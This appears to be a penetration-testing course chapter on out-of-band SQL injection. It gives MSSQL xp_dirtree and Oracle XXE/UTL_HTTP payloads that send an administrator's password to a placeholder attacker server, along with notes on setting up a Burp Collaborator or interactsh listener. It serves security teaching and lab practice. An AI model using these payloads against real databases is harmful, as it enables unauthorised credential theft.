# Out-of-Band (OOB) SQL Injection

> OOB = data is exfiltrated through a **completely different channel** than the HTTP
> response — typically DNS lookups or outbound HTTP requests. Used when the application
> gives no in-band feedback and time-based extraction is too slow or unreliable
> (e.g. due to load balancers, caching, or heavy network jitter).

---

## 1. Why OOB Exists

Some environments:
- Strip all error messages and have near-identical response times regardless of query
  result (kills boolean and time-based).
- Run behind aggressive caching/load-balancing that makes timing measurements useless.
- Have the DB server itself able to reach the internet/internal DNS, even if the web app
  output is fully locked down.

In these cases, you make the **database itself** perform a network request that contains
the stolen data, to a server you control.

---

## 2. MSSQL — `xp_dirtree` / `xp_fileexist` (DNS exfiltration)
```sql
'; exec master..xp_dirtree '//YOUR-COLLAB-SERVER/a'--
```
This forces a UNC path lookup. If the data needs to be embedded, you build the path
dynamically:
```sql
'; declare @p varchar(1024);
   select @p=(SELECT password FROM users WHERE username='administrator');
   exec('master..xp_dirtree "//' + @p + '.YOUR-COLLAB-SERVER/a"')--
```
The resulting DNS query (`<password>.your-collab-server`) is captured on your listener —
even though the HTTP response shows nothing.

## 3. Oracle — UTL_HTTP / UTL_INADDR (DNS exfiltration)
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [ <!ENTITY % remote SYSTEM "http://YOUR-COLLAB-SERVER/"> %remote;]>'),'/l') FROM dual--
```
or more simply, using a known Oracle XXE-style OOB primitive:
```sql
' AND (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><r><![CDATA['||(SELECT password FROM users WHERE username='administrator')||']]></r>'),'/r')) IS NOT NULL--
```
Oracle's `UTL_HTTP.REQUEST()` can also be abused directly if accessible:
```sql
SELECT UTL_HTTP.REQUEST('http://YOUR-COLLAB-SERVER/'||(SELECT password FROM users WHERE username='administrator')) FROM dual--
```

## 4. MySQL — Limited but Possible
MySQL has no built-in DNS/HTTP function by default, but if `secure_file_priv` is unset
and `LOAD_FILE`/`INTO OUTFILE` are usable, or if a UDF (User Defined Function) is
loadable, OOB becomes possible indirectly. In practice MySQL OOB is rare in real
engagements — you usually fall back to boolean/time-based for MySQL targets.

## 5. The Listener Side (Real-World Setup)
- **Burp Collaborator** is the standard tool — it gives you a unique subdomain and shows
  you incoming DNS/HTTP hits in real time, correlated to the payload that triggered them.
- For engagements without Burp Pro, you can self-host using `interactsh` (open-source
  Burp Collaborator alternative) or a simple DNS logging server you control.
- Always use a **unique, randomized subdomain per test** — this avoids ambiguity if
  multiple payloads are in flight and lets you correlate exact data back to exact
  requests.

## 6. Real-World Notes
- OOB is what separates "I think this might be vulnerable" from definitive proof in
  environments with WAFs that strip error content and rate-limit timing attacks — DNS
  exfil is very hard for a WAF to block since it doesn't go through the HTTP layer at all.
- This technique also shows up heavily in **blind XXE** and **blind SSRF** chains, not
  just SQLi — the underlying "make the server talk to me out-of-band" pattern is reusable
  across vuln classes, worth internalizing once rather than memorizing per-vuln.
- On real client networks, outbound DNS/HTTP from the DB server may be firewalled —
  always test OOB callback capability early, don't assume it'll work just because the
  payload is "correct."

## 7. PortSwigger Labs (OOB track)
- Blind SQL injection with out-of-band interaction
- Blind SQL injection with out-of-band data exfiltration

Continue to → `04_Second_Order_SQLi.md`
